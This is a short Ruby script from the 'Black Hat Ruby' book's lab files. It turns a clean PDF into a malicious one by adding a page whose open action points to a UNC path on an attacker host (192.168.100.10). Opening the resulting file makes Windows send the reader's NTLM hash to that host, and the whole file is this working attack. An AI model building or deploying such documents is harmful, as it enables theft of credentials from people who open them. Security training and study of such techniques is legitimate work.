#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Bad-PDF create a PDF that steal NTLM hash 
# Requirements:
#   gem install hexapdf
#
require 'hexapdf'

mal_pdf = HexaPDF::Document.new
cln_pdf = HexaPDF::Document.open(ARGV[0])
cln_pdf.pages.each {|page| mal_pdf.pages << mal_pdf.import(page)}
mal_pdf.pages.add
mal_pdf.pages[1][:AA] = {
    O: {
      Type: :Action,
      F: "\\\\192.168.100.10\\puppy",
      S: :GoToE,
      D: [mal_pdf.pages[0], :Fit],
    }
  } 

mal_pdf.write("bhr-unclean.pdf")
